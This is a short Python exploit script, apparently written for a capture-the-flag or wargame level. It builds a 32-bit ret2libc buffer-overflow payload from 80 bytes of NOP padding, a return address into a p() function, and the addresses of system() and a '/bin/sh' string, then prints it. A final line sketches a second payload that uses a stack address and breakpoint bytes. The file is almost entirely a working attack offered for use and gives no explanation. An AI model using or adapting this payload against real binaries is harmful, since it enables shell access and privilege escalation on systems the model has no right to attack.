import struct

# buffer overflow offset is 80


# p()    return_adress = 0x0804853e
# main() return_adress = 0x0804854b

padding = "\x90" * 80
ret_adress = str(struct.pack("I", 0x0804853e)) #p() func ret addr
system = str(struct.pack("I", 0xb7e6b060))
returnAfterSystem = str(struct.pack("I", 0xb7e5ebe0))
bin_sh = str(struct.pack("I", 0xb7f8cc58)) # /bin/sh

payload = padding + ret_adress + system + returnAfterSystem +  bin_sh
#          80     +     4      +    4   +         4         +   4 
print(payload)



padding + 0xbffff700 + \xCC * 4